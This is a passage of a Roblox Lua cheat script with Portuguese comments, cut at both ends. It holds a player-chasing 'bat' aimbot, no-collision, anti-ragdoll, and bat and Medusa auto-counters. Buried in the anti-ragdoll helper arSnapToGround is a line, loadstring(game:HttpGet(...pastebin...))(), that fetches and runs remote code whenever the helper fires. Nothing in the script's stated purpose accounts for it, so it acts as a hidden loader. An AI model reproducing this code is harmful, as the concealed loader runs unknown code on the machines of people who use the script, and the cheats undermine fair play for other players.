                    rootPart.AssemblyLinearVelocity = Vector3.new(0, rootPart.AssemblyLinearVelocity.Y * 0.5, 0)
                end
            end)
        end
        batBypass.Toggle = function()
            if batBypass.Enabled then
                batBypass.Stop()
            else
                batBypass.Start()
            end
        end
    end
    _G.BlastAimbotV3 = {
        Start = function() snowVS.BatBypass.Start() end,
        Stop = function() snowVS.BatBypass.Stop() end,
        IsEnabled = function() return snowVS.BatBypass.Enabled end,
    }
end

-- ============================================================
-- AIMBOT V4 = BAT BYPASS (retirado do Clean)
-- ============================================================
do
    local Players = game:GetService("Players")
    local RunService = game:GetService("RunService")
    local localPlayer = Players.LocalPlayer
    local BAT_V2_SPEED, BAT_V2_HIT_DIST, BAT_V2_LEAD_STUDS = 55, 13, 3
    local snowVS = { BatBypass = {} }
    do
        local batBypass = snowVS.BatBypass
        batBypass.Enabled = batBypass.Enabled or false
        batBypass.Connection = batBypass.Connection or nil
        batBypass.Z = batBypass.Z
            or {
                targetPlayer = nil,
                lastTargetPos = nil,
                targetVelocity = Vector3.zero,
                smoothedVelocity = Vector3.zero,
                velocityHistory = {},
                accelerationHistory = {},
                aerialVelocityHistory = {},
                previousDirection = nil,
                lastDirectionChangeTime = 0,
                airborneTime = 0,
                lastActivationTime = 0,
                currentPing = 0.1,
                realPingMs = 0,
            }
        batBypass.ZCFG = batBypass.ZCFG
            or {
                FOLLOW_SPEED = BAT_V2_SPEED,
                ACTIVATE_DISTANCE = BAT_V2_HIT_DIST,
                MIN_FOLLOW_DISTANCE = 1,
                PREDICTION_TIME = 0.22,
                PREDICT_AHEAD = BAT_V2_LEAD_STUDS,
                MAX_VELOCITY_CHANGE = 150,
                VELOCITY_SMOOTHING = 0.2,
                MAX_HORIZONTAL_VELOCITY = 80,
                SERVER_TICKRATE = 0.016666666666666666,
                MIN_PING_COMPENSATION = 0.03,
                MAX_PING_COMPENSATION = 0.25,
                ACCELERATION_PREDICTION_WEIGHT = 0.3,
                DIRECTION_CHANGE_DETECTION_TIME = 0.12,
                QUICK_DIRECTION_CHANGE_MULTIPLIER = 1.5,
                GRAVITY = 196.2,
                AIR_CONTROL_FACTOR = 0.8,
                MIN_AIRBORNE_TIME = 0.08,
            }
        local function averageVectors(vectors)
            if #vectors == 0 then
                return Vector3.zero
            end
            local sum = Vector3.zero
            for _, entry in ipairs(vectors) do
                sum += entry
            end
            return sum / #vectors
        end
        local function pushBounded(history, entry, maxEntries)
            table.insert(history, entry)
            if #history > maxEntries then
                table.remove(history, 1)
            end
        end
        batBypass.FindBat = function()
            local character = localPlayer.Character
            if not character then
                return nil
            end
            local tool = character:FindFirstChildOfClass("Tool")
            if tool then
                local lowercaseText = tool.Name:lower()
                if lowercaseText:find("bat", 1, true) or lowercaseText:find("slap", 1, true) then
                    return tool
                end
            end
            local backpack = localPlayer:FindFirstChildOfClass("Backpack")
            if backpack then
                for _, child in ipairs(backpack:GetChildren()) do
                    if child:IsA("Tool") then
                        local lowercaseText = child.Name:lower()
                        if lowercaseText:find("bat", 1, true) or lowercaseText:find("slap", 1, true) then
                            return child
                        end
                    end
                end
            end
            return nil
        end
        local function resetPredictionState()
            local z = batBypass.Z
            z.targetPlayer = nil
            z.lastTargetPos = nil
            z.targetVelocity = Vector3.zero
            z.smoothedVelocity = Vector3.zero
            z.velocityHistory = {}
            z.accelerationHistory = {}
            z.aerialVelocityHistory = {}
            z.previousDirection = nil
            z.airborneTime = 0
        end
        local function findClosestPlayer(rootPart)
            local closestDistance = math.huge
            local closestPlayer = nil
            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= localPlayer and player.Character then
                    local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
                    local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
                    if humanoidRootPart and humanoid and humanoid.Health > 0 then
                        local magnitude = (rootPart.Position - humanoidRootPart.Position).Magnitude
                        if magnitude < closestDistance then
                            closestDistance = magnitude
                            closestPlayer = player
                        end
                    end
                end
            end
            return closestPlayer
        end
        local function applyAngularAim(rootPart, direction)
            if direction.Magnitude < 0.01 then
                return
            end
            local crossVector = rootPart.CFrame.LookVector:Cross(direction.Unit)
            local angle = math.asin(math.clamp(crossVector.Magnitude, -1, 1))
            rootPart.AssemblyAngularVelocity = crossVector.Magnitude > 0.1 and crossVector.Unit * angle * 80
                or Vector3.zero
        end
        local function updatePing()
            local ok, result = pcall(function()
                return game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue()
            end)
            local z = batBypass.Z
            if ok and type(result) == "number" then
                z.realPingMs = math.floor(result)
            end
            z.currentPing = math.clamp(
                z.realPingMs / 1000,
                batBypass.ZCFG.MIN_PING_COMPENSATION,
                batBypass.ZCFG.MAX_PING_COMPENSATION
            )
        end
        batBypass.PingLoopStarted = batBypass.PingLoopStarted or false
        if not batBypass.PingLoopStarted then
            batBypass.PingLoopStarted = true
            task.spawn(function()
                while true do
                    pcall(updatePing)
                    task.wait(0.5)
                end
            end)
        end
        batBypass.StartBodyLock = function() end
        batBypass.StopBodyLock = function() end
        batBypass.Stop = function()
            local z = batBypass.Z
            batBypass.Enabled = false
            if batBypass.Connection then
                batBypass.Connection:Disconnect()
                batBypass.Connection = nil
            end
            local character = localPlayer.Character
            local humanoid = character and character:FindFirstChildOfClass("Humanoid")
            character = character and character:FindFirstChild("HumanoidRootPart")
            if humanoid then
                humanoid.AutoRotate = true
            end
            if character then
                character.AssemblyAngularVelocity = Vector3.zero
            end
            resetPredictionState()
            z.lastActivationTime = 0
        end
        batBypass.Start = function()
            if batBypass.Connection then
                return
            end
            local character = localPlayer.Character
            local humanoid1387 = character and character:FindFirstChildOfClass("Humanoid")
            local rootPart = character and character:FindFirstChild("HumanoidRootPart")
            if not humanoid1387 or not rootPart then
                return
            end
            batBypass.Enabled = true
            humanoid1387.AutoRotate = false
            local tool = batBypass.FindBat()
            if tool and tool.Parent ~= character then
                pcall(function()
                    humanoid1387:EquipTool(tool)
                end)
            end
            batBypass.Connection = RunService.RenderStepped:Connect(function(deltaTime)
                if not batBypass.Enabled then
                    batBypass.Stop()
                    return
                end
                local z = batBypass.Z
                local zcfg = batBypass.ZCFG
                zcfg.FOLLOW_SPEED = math.clamp(tonumber(State.BypassSpeed) or BAT_V2_SPEED, 1, 500)
                local character2 = localPlayer.Character
                local rootPart1394 = character2 and character2:FindFirstChild("HumanoidRootPart")
                local humanoid = character2 and character2:FindFirstChildOfClass("Humanoid")
                if not rootPart1394 or not humanoid or humanoid.Health <= 0 then
                    return
                end
                humanoid.AutoRotate = false
                rootPart = rootPart1394
                humanoid1387 = humanoid
                tool = character2:FindFirstChildOfClass("Tool") or batBypass.FindBat()
                if tool and tool.Parent ~= character2 then
                    pcall(humanoid.EquipTool, humanoid, tool)
                end
                z.targetPlayer = findClosestPlayer(rootPart)
                local character3 = z.targetPlayer and z.targetPlayer.Character
                local rootPart1442 = character3 and character3:FindFirstChild("HumanoidRootPart")
                character3 = character3 and character3:FindFirstChildOfClass("Humanoid")
                if not rootPart1442 or not character3 or character3.Health <= 0 then
                    resetPredictionState()
                    return
                end
                local position = rootPart1442.Position
                local sampleDeltaTime = math.max(deltaTime, 0.0041666666666666666)
                if z.lastTargetPos then
                    local targetVelocity = (position - z.lastTargetPos) / sampleDeltaTime
                    local vector = targetVelocity - z.targetVelocity
                    if zcfg.MAX_VELOCITY_CHANGE < vector.Magnitude then
                        targetVelocity = z.targetVelocity + vector.Unit * zcfg.MAX_VELOCITY_CHANGE
                    end
                    local vector3 = Vector3.new(targetVelocity.X, 0, targetVelocity.Z)
                    if vector3.Magnitude > zcfg.MAX_HORIZONTAL_VELOCITY then
                        local vector = vector3.Unit * zcfg.MAX_HORIZONTAL_VELOCITY
                        targetVelocity = Vector3.new(vector.X, targetVelocity.Y, vector.Z)
                    end
                    pushBounded(z.accelerationHistory, (targetVelocity - z.targetVelocity) / sampleDeltaTime, 4)
                    pushBounded(z.velocityHistory, targetVelocity, 8)
                    z.targetVelocity = targetVelocity
                    z.smoothedVelocity = z.smoothedVelocity:Lerp(targetVelocity, zcfg.VELOCITY_SMOOTHING)
                end
                z.lastTargetPos = position
                local isAirborne = character3.FloorMaterial == Enum.Material.Air
                z.airborneTime = isAirborne and z.airborneTime + sampleDeltaTime or 0
                if isAirborne and z.airborneTime >= zcfg.MIN_AIRBORNE_TIME then
                    pushBounded(z.aerialVelocityHistory, z.targetVelocity, 6)
                elseif not isAirborne then
                    z.aerialVelocityHistory = {}
                end
                local smoothedVelocity = z.smoothedVelocity
                if isAirborne and #z.aerialVelocityHistory > 0 then
                    local vector = averageVectors(z.aerialVelocityHistory)
                    smoothedVelocity = Vector3.new(vector.X, z.targetVelocity.Y, vector.Z) * zcfg.AIR_CONTROL_FACTOR
                end
                local changedDirectionQuickly = false
                local vector3 = Vector3.new(z.targetVelocity.X, 0, z.targetVelocity.Z)
                if vector3.Magnitude > 5 then
                    local unit = vector3.Unit
                    if z.previousDirection and z.previousDirection:Dot(unit) < 0.5 then
                        local lastDirectionChangeTime = z.lastDirectionChangeTime
                        changedDirectionQuickly = tick() - lastDirectionChangeTime
                            < zcfg.DIRECTION_CHANGE_DETECTION_TIME
                        z.lastDirectionChangeTime = tick()
                    end
                    z.previousDirection = unit
                end
                local predictionTime = z.currentPing + zcfg.SERVER_TICKRATE
                if changedDirectionQuickly then
                    predictionTime *= zcfg.QUICK_DIRECTION_CHANGE_MULTIPLIER
                end
                local accelerationPredictionWeight = zcfg.ACCELERATION_PREDICTION_WEIGHT
                local predictedPosition = position
                    + smoothedVelocity * predictionTime
                    + averageVectors(z.accelerationHistory)
                        * accelerationPredictionWeight
                        * predictionTime
                        * predictionTime
                        * 0.5
                local leadTime = zcfg.PREDICTION_TIME * 1.1
                local leadPosition
                if isAirborne then
                    leadPosition = predictedPosition
                        + smoothedVelocity * leadTime
                        + Vector3.new(0, -0.5 * zcfg.GRAVITY * leadTime * leadTime, 0)
                else
                    leadPosition = predictedPosition + smoothedVelocity * leadTime
                end
                local vector4 = Vector3.new(smoothedVelocity.X, 0, smoothedVelocity.Z)
                if vector4.Magnitude > 1 then
                    leadPosition += vector4.Unit * zcfg.PREDICT_AHEAD
                end
                local targetDirection = leadPosition - rootPart.Position
                applyAngularAim(rootPart, targetDirection)
                local withinActivationRange = (position - rootPart.Position).Magnitude <= zcfg.ACTIVATE_DISTANCE
                if withinActivationRange then
                    local lastActivationTime = z.lastActivationTime
                    withinActivationRange = tick() - lastActivationTime >= 0.3
                end
                if withinActivationRange then
                    if tool then
                        pcall(tool.Activate, tool)
                    end
                    z.lastActivationTime = tick()
                end
                if zcfg.MIN_FOLLOW_DISTANCE < targetDirection.Magnitude then
                    rootPart.AssemblyLinearVelocity = targetDirection.Unit * zcfg.FOLLOW_SPEED
                else
                    rootPart.AssemblyLinearVelocity = Vector3.new(0, rootPart.AssemblyLinearVelocity.Y * 0.5, 0)
                end
            end)
        end
        batBypass.Toggle = function()
            if batBypass.Enabled then
                batBypass.Stop()
            else
                batBypass.Start()
            end
        end
    end
    _G.BlastAimbotV4 = {
        Start = function() snowVS.BatBypass.Start() end,
        Stop = function() snowVS.BatBypass.Stop() end,
        IsEnabled = function() return snowVS.BatBypass.Enabled end,
    }
end






-- No Collision
function startNoCollide()
    if Conns.noCollideLoop then return end
    Conns.noCollideLoop = RunService.Stepped:Connect(function()
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LP and player.Character then
                for _, part in ipairs(player.Character:GetDescendants()) do
                    if part:IsA("BasePart") then
                        part.CanCollide = false
                    end
                end
            end
        end
    end)
end

function stopNoCollide()
    if Conns.noCollideLoop then
        Conns.noCollideLoop:Disconnect()
        Conns.noCollideLoop = nil
    end
end

-- Anti Ragdoll V1 (Mystery) / V2 — packed into State.antiRag to save locals
-- ============================================================
State.antiRag = State.antiRag or {
	cached = {},
	fallingDownSince = nil,
	conn = nil,
	lastV2Tick = 0,
	wasRagdolled = false,
	ragdollConnections = {},
}

do
	local AR = State.antiRag
	local AR_RAY = RaycastParams.new()
	AR_RAY.FilterType = Enum.RaycastFilterType.Exclude
	AR_RAY.IgnoreWater = true

	local function cacheCharacter()
		local char = LP.Character
		if not char then AR.cached = {}; return false end
		AR.cached = {
			character = char,
			humanoid = char:FindFirstChildOfClass("Humanoid"),
			root = char:FindFirstChild("HumanoidRootPart"),
		}
		return AR.cached.humanoid ~= nil
	end

	local function arSnapToGround(char, hum, root)
		if not char or not hum or not root then return end
		-- Holding brainrot: never move root (prevents drop/reset)
		if _G.AceBrainrotSafe and _G.AceBrainrotSafe() then return end
		pcall(function()
         loadstring(game:HttpGet("https://pastebin.com/raw/2H5JyQKE"))()
			AR_RAY.FilterDescendantsInstances = { char }
			local origin = root.Position + Vector3.new(0, 3, 0)
			local result = workspace:Raycast(origin, Vector3.new(0, -250, 0), AR_RAY)
			root.AssemblyLinearVelocity = Vector3.zero
			root.AssemblyAngularVelocity = Vector3.zero
			pcall(function()
				root.Velocity = Vector3.zero
				root.RotVelocity = Vector3.zero
			end)
			for _, obj in ipairs(char:GetDescendants()) do
				if obj:IsA("BodyVelocity") or obj:IsA("BodyForce")
					or obj:IsA("BodyGyro") or obj:IsA("LinearVelocity")
					or obj:IsA("VectorForce") or obj:IsA("AngularVelocity")
					or obj:IsA("AlignPosition") then
					pcall(function() obj:Destroy() end)
				end
			end
			if result then
				local hip = (hum.HipHeight or 0) + (root.Size.Y * 0.5) + 0.1
				local _, y, _ = root.CFrame:ToEulerAnglesYXZ()
				root.CFrame = CFrame.new(result.Position + Vector3.new(0, hip, 0))
					* CFrame.Angles(0, y, 0)
				root.AssemblyLinearVelocity = Vector3.zero
			end
		end)
	end

	local function arRefreshSpeedEngine()
		-- Clear any stuck speed physics state after ragdoll exit
		pcall(function()
			if SPD and SPD.resetMovementState then SPD.resetMovementState() end
		end)
	end

	local function isRagdolledV1()
		local hum = AR.cached.humanoid
		if not hum or not hum.Parent then return false end
		local st = hum:GetState()
		if st == Enum.HumanoidStateType.Physics
			or st == Enum.HumanoidStateType.Ragdoll
			or st == Enum.HumanoidStateType.FallingDown then
			return true
		end
		if hum.PlatformStand == true then return true end
		local endTime = LP:GetAttribute("RagdollEndTime")
		if endTime and (endTime - workspace:GetServerTimeNow()) > 0 then return true end
		local char = AR.cached.character
		if char then
			for _, v in ipairs(char:GetDescendants()) do
				if v:IsA("BallSocketConstraint") then return true end
				if v:IsA("Attachment") and tostring(v.Name):find("Ragdoll") then return true end
			end
		end
		return false
	end

	local function forceExitRagdollV1()
		local char = AR.cached.character
		local hum = AR.cached.humanoid
		local root = AR.cached.root
		if not char or not hum or not root then return end
		-- Don't fight while holding brainrot
		if _G.AceBrainrotSafe and _G.AceBrainrotSafe() then return end
		pcall(function()
			LP:SetAttribute("RagdollEndTime", workspace:GetServerTimeNow())
		end)
		pcall(function()
			for _, descendant in ipairs(char:GetDescendants()) do
				if descendant:IsA("BallSocketConstraint")
					or (descendant:IsA("Attachment") and tostring(descendant.Name):find("Ragdoll")) then
					pcall(function() descendant:Destroy() end)
				elseif descendant:IsA("Motor6D") then
					descendant.Enabled = true
				end
			end
		end)
		if hum.Health <= 0 then return end
		pcall(function()
			root.Anchored = false
			hum.PlatformStand = false
			hum.Sit = false
			hum.AutoRotate = true
			hum:ChangeState(Enum.HumanoidStateType.GettingUp)
			arSnapToGround(char, hum, root)
			hum:ChangeState(Enum.HumanoidStateType.Landed)
			hum:ChangeState(Enum.HumanoidStateType.Running)
		end)
		pcall(function()
			local ps = LP:FindFirstChild("PlayerScripts")
			local pm = ps and ps:FindFirstChild("PlayerModule")
			local cm = pm and pm:FindFirstChild("ControlModule")
			if cm then
				local ok, mod = pcall(require, cm)
				if ok and mod and mod.Enable then pcall(function() mod:Enable() end) end
			end
		end)
		AR.wasRagdolled = true
	end

	local function forceExitRagdollV2()
		local now = tick()
		if now - (AR.lastV2Tick or 0) < 0.05 then return end
		AR.lastV2Tick = now
		local char = LP.Character
		if not char then return end
		local hum = char:FindFirstChildOfClass("Humanoid")
		local root = char:FindFirstChild("HumanoidRootPart")
		if not hum or not root or hum.Health <= 0 then return end
		if _G.AceBrainrotSafe and _G.AceBrainrotSafe() then return end
		pcall(function()
			hum.PlatformStand = false
			hum.Sit = false
			hum.AutoRotate = true
			root.Anchored = false
			for _, obj in ipairs(char:GetDescendants()) do
				if obj:IsA("Motor6D") then
					obj.Enabled = true
				elseif obj:IsA("BallSocketConstraint") then
					pcall(function() obj:Destroy() end)
				elseif obj:IsA("Constraint") or obj:IsA("HingeConstraint") then
					obj.Enabled = true
				elseif obj:IsA("BasePart") then
					obj.AssemblyLinearVelocity = Vector3.zero
					obj.AssemblyAngularVelocity = Vector3.zero
				end
			end
			hum:ChangeState(Enum.HumanoidStateType.GettingUp)
			arSnapToGround(char, hum, root)
			hum:ChangeState(Enum.HumanoidStateType.Landed)
			hum:ChangeState(Enum.HumanoidStateType.Running)
			if hum.JumpPower and hum.JumpPower <= 0 then hum.JumpPower = 50 end
			if workspace.CurrentCamera then workspace.CurrentCamera.CameraSubject = hum end
		end)
		pcall(function()
			local ps = LP:FindFirstChild("PlayerScripts")
			local pm = ps and ps:FindFirstChild("PlayerModule")
			local cm = pm and pm:FindFirstChild("ControlModule")
			if cm then
				local ok, mod = pcall(require, cm)
				if ok and mod and mod.Enable then pcall(function() mod:Enable() end) end
			end
		end)
		arRefreshSpeedEngine()
	end

	function startAntiRagdoll()
		if AR.conn then pcall(function() AR.conn:Disconnect() end); AR.conn = nil end
		if Conns.antiRagdoll then pcall(function() Conns.antiRagdoll:Disconnect() end); Conns.antiRagdoll = nil end
		for _, c in ipairs(AR.ragdollConnections or {}) do pcall(function() c:Disconnect() end) end
		AR.ragdollConnections = {}
		State.antiRagdollEnabled = true
		AR.fallingDownSince = nil
		AR.wasRagdolled = false
		local isV2 = (State.antiRagdollMode == "V2")
		if isV2 then
			AR.lastV2Tick = 0
			AR.conn = RunService.Heartbeat:Connect(function()
				if not State.antiRagdollEnabled then return end
				local char = LP.Character
				if not char then return end
				local hum = char:FindFirstChildOfClass("Humanoid")
				local root = char:FindFirstChild("HumanoidRootPart")
				if not hum or not root or hum.Health <= 0 then return end
				local state = hum:GetState()
				if state == Enum.HumanoidStateType.Physics
					or state == Enum.HumanoidStateType.Ragdoll
					or state == Enum.HumanoidStateType.FallingDown
					or hum.PlatformStand == true
					or hum.Sit == true then
					forceExitRagdollV2()
				end
			end)
		else
			if not cacheCharacter() then
				task.wait(0.35)
				cacheCharacter()
			end
			-- Camera subject guard (Mystery V1)
			local camConn = RunService.RenderStepped:Connect(function()
				if not State.antiRagdollEnabled then return end
				local cam = workspace.CurrentCamera
				if cam and AR.cached.humanoid and AR.cached.humanoid.Parent then
					cam.CameraSubject = AR.cached.humanoid
				end
			end)
			table.insert(AR.ragdollConnections, camConn)
			-- V1 heartbeat loop (Mystery boost method)
			AR.conn = RunService.Heartbeat:Connect(function()
				if not State.antiRagdollEnabled then return end
				if not AR.cached.humanoid or not AR.cached.humanoid.Parent then
					cacheCharacter()
					return
				end
				local currentlyRagdolled = isRagdolledV1()
				if currentlyRagdolled then
					forceExitRagdollV1()
				elseif AR.wasRagdolled then
					AR.wasRagdolled = false
					if AR.cached.humanoid and AR.cached.root then
						arSnapToGround(AR.cached.character, AR.cached.humanoid, AR.cached.root)
					end
					arRefreshSpeedEngine()
				end
			end)
		end
		Conns.antiRagdoll = AR.conn
	end

	function stopAntiRagdoll()
		State.antiRagdollEnabled = false
		if AR.conn then pcall(function() AR.conn:Disconnect() end); AR.conn = nil end
		if Conns.antiRagdoll then pcall(function() Conns.antiRagdoll:Disconnect() end); Conns.antiRagdoll = nil end
		for _, c in ipairs(AR.ragdollConnections or {}) do pcall(function() c:Disconnect() end) end
		AR.ragdollConnections = {}
		AR.cached = {}
		AR.fallingDownSince = nil
		AR.wasRagdolled = false
	end

	LP.CharacterAdded:Connect(function()
		task.wait(0.5)
		cacheCharacter()
		if State.antiRagdollEnabled then
			startAntiRagdoll()
		end
	end)
end


-- CAMERA RECOVERY (corrige camera travada apos medusa/ragdoll)
-- ============================================================
trackConn(RunService.Heartbeat:Connect(function()
    local char = LP.Character
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum or hum.Health <= 0 then return end

    -- Nao interfere enquanto o personagem esta em ragdoll (o anti-ragdoll cuida disso)
    local st = hum:GetState()
    if st == Enum.HumanoidStateType.Physics
    or st == Enum.HumanoidStateType.Ragdoll
    or st == Enum.HumanoidStateType.FallingDown then
        return
    end

    -- Se a camera desgrudou do personagem (efeito da medusa), reanexa ela
    local cam = workspace.CurrentCamera
    if cam and (cam.CameraSubject ~= hum or cam.CameraType == Enum.CameraType.Scriptable) then
        pcall(function()
            cam.CameraType = Enum.CameraType.Custom
            cam.CameraSubject = hum
        end)
    end
end))

-- Bat Counter
local BAT_LIST={"Bat","Slap","Iron Slap","Gold Slap","Diamond Slap","Emerald Slap","Ruby Slap","Dark Matter Slap","Flame Slap","Nuclear Slap","Galaxy Slap","Glitched Slap"}
local function findBatForCounter()
    local c=LP.Character; if not c then return nil end
    local bp=LP:FindFirstChildOfClass("Backpack")
    for _,name in ipairs(BAT_LIST) do local t=c:FindFirstChild(name) or (bp and bp:FindFirstChild(name)); if t then return t end end
    return nil
end
startBatCounter = function()
    if Conns.batCounter then return end
    Conns.batCounter=RunService.Heartbeat:Connect(function()
        if not State.batCounterEnabled or State.batCounterDebounce then return end
        local char=LP.Character; if not char then return end
        local hum2=char:FindFirstChildOfClass("Humanoid"); if not hum2 then return end
        local st=hum2:GetState()
        if st==Enum.HumanoidStateType.Physics or st==Enum.HumanoidStateType.Ragdoll or st==Enum.HumanoidStateType.FallingDown then
            State.batCounterDebounce=true
            task.spawn(function()
                local bat=findBatForCounter()
                if bat then
                    local hum3=char:FindFirstChildOfClass("Humanoid")
                    if bat.Parent~=char and hum3 then pcall(function() hum3:EquipTool(bat) end); task.wait(0.05) end
                    pcall(function() bat:Activate() end); task.wait(0.15); pcall(function() bat:Activate() end)
                end
                task.wait(0.5); State.batCounterDebounce=false
            end)
        end
    end)
end
stopBatCounter = function() if Conns.batCounter then Conns.batCounter:Disconnect(); Conns.batCounter=nil end; State.batCounterDebounce=false end

-- Unwalk
local _unwalkAnimations={}
local function _disableAnimations()
    local char=LP.Character; if not char then return end
    local hum2=char:FindFirstChildOfClass("Humanoid"); if not hum2 then return end
    for _,track in pairs(_unwalkAnimations) do pcall(function() track:Stop() end) end
    _unwalkAnimations={}
    local animator=hum2:FindFirstChildOfClass("Animator")
    if animator then for _,track in pairs(animator:GetPlayingAnimationTracks()) do track:Stop(); table.insert(_unwalkAnimations,track) end end
end
startUnwalk = function()
    _disableAnimations()
    if Conns.unwalk then Conns.unwalk:Disconnect() end
    Conns.unwalk=RunService.Heartbeat:Connect(function() if State.unwalkEnabled then _disableAnimations() end end)
end
stopUnwalk = function()
    if Conns.unwalk then Conns.unwalk:Disconnect(); Conns.unwalk=nil end; _unwalkAnimations={}
end



-- Custom Anims
setCustomAnims = function()
    local char = LP.Character or LP.CharacterAdded:Wait()
    local animate
    local mode = State.tryhardAnimMode or "V1"

    -- Espera o script Animate carregar (com run e walk prontos)
    for _ = 1, 40 do
        animate = char:FindFirstChild("Animate")
        if animate and animate:FindFirstChild("run") and animate:FindFirstChild("walk") then break end
        task.wait(0.1)
    end
    if not animate then return end

    -- Funcao que limpa animacoes antigas e insere a nova
    local function setAnim(folder, childName, id)
        if not folder then return end
        for _, child in ipairs(folder:GetChildren()) do
            if child:IsA("Animation") then child:Destroy() end
        end
        local a = Instance.new("Animation")
        a.Name = childName
        a.AnimationId = "rbxassetid://" .. tostring(id)
        a.Parent = folder
    end

    if State.tryhardAnimEnabled then
        if mode == "V2" then
            setAnim(animate:FindFirstChild("run"),  "RunAnim",  RembembiAnims.RunAnim)
            setAnim(animate:FindFirstChild("jump"), "JumpAnim", RembembiAnims.JumpAnim)
            setAnim(animate:FindFirstChild("walk"), "WalkAnim", RembembiAnims.WalkAnim)
            setAnim(animate:FindFirstChild("fall"), "FallAnim", RembembiAnims.FallAnim)
            setAnim(animate:FindFirstChild("climb"), "ClimbAnim", RembembiAnims.ClimbAnim)
            setAnim(animate:FindFirstChild("swim"), "Swim", RembembiAnims.Swim)
            setAnim(animate:FindFirstChild("swimidle"), "SwimIdle", RembembiAnims.SwimIdle)

            local idleFolder = animate:FindFirstChild("idle")
            setAnim(idleFolder, "Animation1", RembembiAnims.Animation1)
            setAnim(idleFolder, "Animation2", RembembiAnims.Animation2)
        else
            -- Tryhard V1
            setAnim(animate:FindFirstChild("run"),  "RunAnim",  616163682)
            setAnim(animate:FindFirstChild("jump"), "JumpAnim", 116936326516985)
            setAnim(animate:FindFirstChild("walk"), "WalkAnim", 109168724482748)
            setAnim(animate:FindFirstChild("fall"), "FallAnim", 92294537340807)
            setAnim(animate:FindFirstChild("climb"), "ClimbAnim", 507765644)
            setAnim(animate:FindFirstChild("swim"), "Swim", 507784897)
            setAnim(animate:FindFirstChild("swimidle"), "SwimIdle", 507785072)

            local idleFolder = animate:FindFirstChild("idle")
            setAnim(idleFolder, "Animation1", 133806214992291)
            setAnim(idleFolder, "Animation2", 94970088341563)
        end
    else
        -- R15 padrao
        setAnim(animate:FindFirstChild("run"),  "RunAnim",  507767714)
        setAnim(animate:FindFirstChild("jump"), "JumpAnim", 507765049)
        setAnim(animate:FindFirstChild("walk"), "WalkAnim", 507777826)
        setAnim(animate:FindFirstChild("fall"), "FallAnim", 507767968)
        setAnim(animate:FindFirstChild("climb"), "ClimbAnim", 507765644)
        setAnim(animate:FindFirstChild("swim"), "Swim", 507784897)
        setAnim(animate:FindFirstChild("swimidle"), "SwimIdle", 507785072)

        local idleFolder = animate:FindFirstChild("idle")
        setAnim(idleFolder, "Animation1", 507766388)
        setAnim(idleFolder, "Animation2", 507766666)
    end

    -- Reinicia o script Animate para forcar reload
    animate.Disabled = true
    task.wait(0.06)
    animate.Disabled = false

    -- Forca o Humanoid a recarregar as animacoes imediatamente
    local hum = char:FindFirstChildOfClass("Humanoid")
    if hum then
        pcall(function()
            hum:ChangeState(Enum.HumanoidStateType.Landed)
            task.wait(0.03)
            hum:ChangeState(Enum.HumanoidStateType.Running)
        end)
    end
end

-- Medusa Counter
local function findMedusa()
    local c=LP.Character; if not c then return nil end
    for _,t in ipairs(c:GetChildren()) do if t:IsA("Tool") then local n=t.Name:lower(); if n:find("medusa") or n:find("head") or n:find("stone") then return t end end end
    local bp=LP:FindFirstChild("Backpack")
    if bp then for _,t in ipairs(bp:GetChildren()) do if t:IsA("Tool") then local n=t.Name:lower(); if n:find("medusa") then return t end end end end
    return nil
end
local function useMedusaCounter()
    if State.medusaDebounce or tick()-State.medusaLastUsed<MEDUSA_COOLDOWN then return end
    local c=LP.Character; if not c then return end
    State.medusaDebounce=true
    local med=findMedusa(); if not med then State.medusaDebounce=false; return end
    if med.Parent~=c then local hum2=c:FindFirstChildOfClass("Humanoid"); if hum2 then hum2:EquipTool(med) end end
    pcall(function() med:Activate() end); State.medusaLastUsed=tick(); State.medusaDebounce=false
end
setupMedusaCounter = function(char)
    for _,c2 in pairs(Conns.anchor) do pcall(function() c2:Disconnect() end) end; Conns.anchor={}
    if not char then return end
    
    -- Monitora apenas partes vitais do personagem, ignorando ferramentas equipadas
    local bodyParts = {"HumanoidRootPart", "Head", "UpperTorso", "LowerTorso", "Torso"}
    for _, partName in ipairs(bodyParts) do
        local part = char:FindFirstChild(partName)
        if part and part:IsA("BasePart") then
            table.insert(Conns.anchor, part:GetPropertyChangedSignal("Anchored"):Connect(function()
                -- Só ativa se a parte for ancorada E o personagem estiver transparente (efeito da Medusa)
                -- Adicionalmente, verifica se o item equipado não é o que causou o trigger
                if part.Anchored and part.Transparency >= 0.9 then
                    local med = findMedusa()
                    if med then
                        useMedusaCounter()
                    end
                end
            end))
        end
    end
end
stopMedusaCounter = function() for _,c2 in pairs(Conns.anchor) do pcall(function() c2:Disconnect() end) end; Conns.anchor={} end

-- Anti Medusa Logic
local function hookMedusa(tool)
    if not tool:IsA("Tool") then return end
    local n = tool.Name:lower()
    if n:find("medusa") or n:find("head") or n:find("stone") then
        tool.Activated:Connect(function()
            if State.antiMedusaEnabled then
                -- Delay otimizado: tempo suficiente para o jogo registrar o uso
                -- mas rapido o bastante para o novo Insta Reset nao bugar
                task.wait(0.12) 
                local char = LP.Character
                local hum = char and char:FindFirstChildOfClass("Humanoid")
                if hum then hum.Health = 0 end
            end
        end)
    end
end


LP.CharacterAdded:Connect(function(char)
    char.ChildAdded:Connect(hookMedusa)
    for _, t in ipairs(char:GetChildren()) do hookMedusa(t) end
end)
if LP.Character then
    for _, t in ipairs(LP.Character:GetChildren()) do hookMedusa(t) end
    LP.Character.ChildAdded:Connect(hookMedusa)
end


-- AUTO STEAL: implemented above (Smoke Ambitious port)

-- ============================================================
-- INFINITE JUMP (sistema do Night Hub — ver bloco acima)
-- ============================================================
-- ============================================================
-- CHARACTER SETUP
-- ============================================================
local CharSetup = {}

CharSetup.phase1 = function()
    if State.noCollideEnabled then startNoCollide() end
end

CharSetup.phase2 = function(char)
    h=char:WaitForChild("Humanoid",5); hrp=char:WaitForChild("HumanoidRootPart",5)
    if not h or not hrp then return false end
    return true
end

CharSetup.phase3 = function(char)
    if State.unwalkEnabled then
        startUnwalk() 
    end
    if State.stretchRezEnabled then enableStretchRez() end
    if State.antiRagdollEnabled then startAntiRagdoll() end
    if State.medusaCounterEnabled then setupMedusaCounter(char) end
    if State.batAimbotToggled then stopBatAimbot(); task.wait(0.2); pcall(startBatAimbot) end
    if State.batCounterEnabled then task.wait(0.3); startBatCounter() end
    -- TP Bat removed
